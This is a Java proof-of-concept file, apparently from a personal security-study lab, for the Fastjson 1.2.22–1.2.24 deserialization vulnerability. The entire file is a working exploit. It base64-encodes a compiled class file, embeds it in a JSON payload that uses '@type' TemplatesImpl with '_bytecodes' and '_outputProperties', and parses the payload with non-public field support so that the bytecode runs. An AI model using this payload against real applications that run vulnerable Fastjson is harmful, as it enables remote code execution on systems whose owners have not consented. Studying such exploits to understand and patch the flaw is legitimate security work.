import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Fastjson 1.2.22-1.2.24 版本的反序列化漏洞
 * 基于TemplateImpl的fastjson反序列化
 **/
public class Poc1 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            String classFilePath = "C:\\Users\\Catcher\\Desktop\\JavaSec\\01.Java安全研究\\GitHub-JavaSec\\JavaSec-Study\\FastJson-Labs\\fastjson-demo01\\target\\classes\\CalcTest.class";
            String evilCode = readClass(classFilePath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," + ",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}